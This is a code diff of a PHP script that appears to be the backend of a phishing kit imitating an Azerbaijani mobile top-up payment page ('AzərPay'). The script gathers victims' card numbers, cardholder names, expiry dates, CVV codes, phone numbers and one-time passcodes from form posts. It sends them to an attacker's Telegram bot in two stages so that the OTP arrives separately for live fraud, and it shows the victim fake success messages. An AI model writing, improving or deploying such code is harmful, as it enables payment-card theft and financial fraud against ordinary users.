@@ -18,75 +18,100 @@ $operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '
 $phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : 'Məlumat yoxdur';
 $amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : 'Məlumat yoxdur';
 $ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
-$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : 'Məlumat yoxdur';
+$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
 $campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
 
 $id = rand(1000, 9999);
 
 // ============================================
-// 📝 TƏMİZ VƏ ANLAŞILAN MESAJ FORMATI
+// 📤 TELEGRAM-A GÖNDƏRME FUNKSİYASI
 // ============================================
-$message = "═══════════════════════════════════\n";
-$message .= "      💳 YENİ KART MƏLUMATLARI      \n";
-$message .= "═══════════════════════════════════\n\n";
+function sendToTelegram($message) {
+    global $botToken, $chatId;
+    
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
+    $postData = [
+        'chat_id' => $chatId,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
 
-$message .= "📌 SİFARİŞ MƏLUMATLARI\n";
-$message .= "───────────────────────────────\n";
-$message .= "🆔 Sifariş ID: #" . $id . "\n";
-$message .= "📱 Operator: " . $operator . "\n";
-$message .= "📞 Telefon: " . $phone . "\n";
-$message .= "💰 Məbləğ: " . $amount . " AZN\n";
-if (!empty($campaign)) {
-    $message .= "📦 Paket: " . $campaign . "\n";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+    $response = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return $httpCode;
 }
-$message .= "───────────────────────────────\n\n";
 
-$message .= "💳 KART MƏLUMATLARI\n";
-$message .= "───────────────────────────────\n";
-$message .= "💳 Kart Nömrəsi: " . $cardNumber . "\n";
-$message .= "👤 Kart Sahibi: " . $cardName . "\n";
-$message .= "📅 Bitiş Tarixi: " . $cardExpiry . "\n";
-$message .= "🔐 CVV Kodu: " . $cardCvv . "\n";
-$message .= "───────────────────────────────\n\n";
+// ============================================
+// 📝 1-Cİ MESAJ: YALNIZ KART MƏLUMATLARI
+// ============================================
+if (empty($otp)) {
+    $message1 = "═══════════════════════════════════\n";
+    $message1 .= "      💳 YENİ KART GİRİŞİ      \n";
+    $message1 .= "═══════════════════════════════════\n\n";
+    
+    $message1 .= "🆔 ID: #" . $id . "\n";
+    $message1 .= "📞 Tel: " . $phone . "\n";
+    $message1 .= "💰 Tutar: " . $amount . " AZN\n\n";
+    
+    $message1 .= "💳 CC: " . $cardNumber . "\n";
+    $message1 .= "📅 Tarix: " . $cardExpiry . "\n";
+    $message1 .= "🔐 CVV: " . $cardCvv . "\n";
+    $message1 .= "👤 İsim: " . $cardName . "\n\n";
+    
+    $message1 .= "🌐 IP: " . $ip . "\n";
+    $message1 .= "═══════════════════════════════════";
+    
+    sendToTelegram($message1);
+    
+    // LOG
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART GÖNDƏRİLDİ | IP: $ip\n";
+    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
+    
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'success', 'message' => '✅ Kart məlumatları göndərildi!']);
+    exit;
+}
 
-$message .= "🔐 TƏSDİQ MƏLUMATLARI\n";
-$message .= "───────────────────────────────\n";
-$message .= "🔑 OTP Kodu: " . $otp . "\n";
-$message .= "🌐 IP Ünvan: " . $ip . "\n";
-$message .= "⏰ Vaxt: " . date('d.m.Y H:i:s') . "\n";
-$message .= "───────────────────────────────\n\n";
+// ============================================
+// 📝 2-Cİ MESAJ: OTP + PAKET MƏLUMATLARI
+// ============================================
+if (!empty($otp)) {
+    $message2 = "═══════════════════════════════════\n";
+    $message2 .= "      🔑 OTP TƏSDİQİ      \n";
+    $message2 .= "═══════════════════════════════════\n\n";
+    
+    $message2 .= "🔑 OTP Kodu: " . $otp . "\n";
+    $message2 .= "🌐 IP: " . $ip . "\n";
+    if (!empty($campaign)) {
+        $message2 .= "📦 Paket: " . $campaign . "\n";
+    }
+    $message2 .= "───────────────────────────────\n";
+    $message2 .= "📱 Bağlı Nömrə: " . $phone . "\n";
+    $message2 .= "═══════════════════════════════════";
+    
+    sendToTelegram($message2);
+    
+    // LOG
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | IP: $ip\n";
+    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
+    
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'success', 'message' => '✅ OTP təsdiqləndi!']);
+    exit;
+}
 
-$message .= "📱 BAĞLI NÖMRƏ: " . $phone . "\n";
-$message .= "═══════════════════════════════════\n";
-$message .= "✅ AzərPay ilə uğurlu əməliyyat!";
-
-// TELEGRAM-A GÖNDƏR
-$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-
-$postData = [
-    'chat_id' => $chatId,
-    'text' => $message,
-    'parse_mode' => 'HTML'
-];
-
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $url);
-curl_setopt($ch, CURLOPT_POST, true);
-curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_setopt($ch, CURLOPT_TIMEOUT, 30);
-
-$response = curl_exec($ch);
-$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-curl_close($ch);
-
-// LOG
-$logData = date('Y-m-d H:i:s') . " | ID: #$id | IP: $ip | OTP: $otp | HTTP: $httpCode\n";
-file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
-
-// CAVAB
+// HEÇ BİR MƏLUMAT YOXDURSA
 header('Content-Type: application/json');
-echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
+echo json_encode(['status' => 'error', 'message' => '❌ Məlumat tapılmadı!']);
 exit;
 ?>
